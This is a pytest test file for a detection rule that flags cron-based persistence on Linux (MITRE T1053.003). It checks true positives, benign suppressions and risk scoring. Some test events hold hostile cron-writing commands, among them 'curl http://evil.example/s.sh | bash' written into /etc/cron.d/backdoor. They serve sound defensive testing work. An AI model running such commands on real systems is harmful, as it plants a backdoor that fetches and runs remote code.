import pytest
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

RULE_ID = "linux_t1053_003_cron_persistence"


@pytest.fixture
def engine():
    return YAMLDetectionEngine()


def _cron(engine, event):
    candidates = engine.evaluate_event(event, return_unmatched=True)
    return next((c for c in candidates if c.rule_id == RULE_ID), None)


# ---------------------------------------------------------------------------
# True positives
# ---------------------------------------------------------------------------

def test_t1053_matches_shell_writing_cron_with_network_tool(engine):
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {"path": "/etc/cron.d/backdoor", "name": "backdoor"},
        "process": {
            "name": "bash",
            "command_line": (
                "bash -c \"echo '* * * * * root curl http://evil.example/s.sh | bash'"
                " > /etc/cron.d/backdoor\""
            ),
            "parent": {"name": "sshd"},
        },
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    c = _cron(engine, event)
    assert c is not None and c.matched is True and c.suppressed is False


def test_t1053_matches_cron_entry_referencing_tmp_in_spool(engine):
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {"path": "/var/spool/cron/root", "name": "root"},
        "process": {
            "name": "bash",
            "command_line": "bash -c \"echo '* * * * * /tmp/x.sh' > /var/spool/cron/root\"",
        },
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    c = _cron(engine, event)
    assert c is not None and c.matched is True and c.suppressed is False


# ---------------------------------------------------------------------------
# False positives
# ---------------------------------------------------------------------------

def test_t1053_no_match_admin_crontab_edit(engine):
    """`crontab -e` writes via the crontab binary (not a shell) with a clean
    command — must not match."""
    event = {
        "event": {"category": "file", "type": "change", "action": "write"},
        "file": {"path": "/var/spool/cron/crontabs/root", "name": "root"},
        "process": {"name": "crontab", "command_line": "crontab -e"},
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    c = _cron(engine, event)
    assert c is None or c.matched is False


def test_t1053_package_manager_cron_write_suppressed(engine):
    """A dpkg maintainer `sh -c` writing a clean cron file touches the rule
    (shell process) but is suppressed as benign package-manager activity."""
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {"path": "/etc/cron.d/logrotate", "name": "logrotate"},
        "process": {
            "name": "sh",
            "command_line": "sh -c 'cp /usr/share/pkg/logrotate.cron /etc/cron.d/logrotate'",
            "parent": {"name": "dpkg"},
        },
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    c = _cron(engine, event)
    assert c is not None
    assert c.matched is True
    assert c.suppressed is True
    assert c.suppression_id == "benign_package_manager_service_write"


# ---------------------------------------------------------------------------
# Malformed / required-fields guard
# ---------------------------------------------------------------------------

def test_t1053_skips_missing_file_path(engine):
    event = {
        "event": {"action": "created"},
        "process": {"name": "bash", "command_line": "bash -c 'echo x > /etc/cron.d/y'"},
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    c = _cron(engine, event)
    assert c is not None
    assert c.matched is False
    assert "file.path" in c.missing_fields


# ---------------------------------------------------------------------------
# Risk scoring + MITRE metadata
# ---------------------------------------------------------------------------

def test_t1053_network_tool_raises_score(engine):
    base_event = {
        "event": {"action": "created"},
        "file": {"path": "/etc/cron.d/job", "name": "job"},
        "process": {"name": "bash", "command_line": "bash -c \"echo '* * * * * /root/x' > /etc/cron.d/job\""},
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    net_event = {
        "event": {"action": "created"},
        "file": {"path": "/etc/cron.d/job", "name": "job"},
        "process": {"name": "bash", "command_line": "bash -c \"echo '* * * * * curl http://x/s|bash' > /etc/cron.d/job\""},
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }
    base = _cron(engine, base_event)
    net = _cron(engine, net_event)
    assert net.risk_score > base.risk_score
    assert any("fetching content from the network" in r for r in net.adjustment_reasons)


def test_t1053_mitre_metadata(engine):
    c = _cron(engine, {
        "event": {"action": "created"},
        "file": {"path": "/etc/cron.d/job", "name": "job"},
        "process": {"name": "bash", "command_line": "bash -c \"echo x > /etc/cron.d/job\""},
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    })
    assert c is not None and c.matched is True
    assert c.mitre.get("technique", {}).get("id") == "T1053"
    assert c.mitre.get("subtechnique", {}).get("id") == "T1053.003"
    assert c.mitre.get("tactic", {}).get("id") == "TA0003"
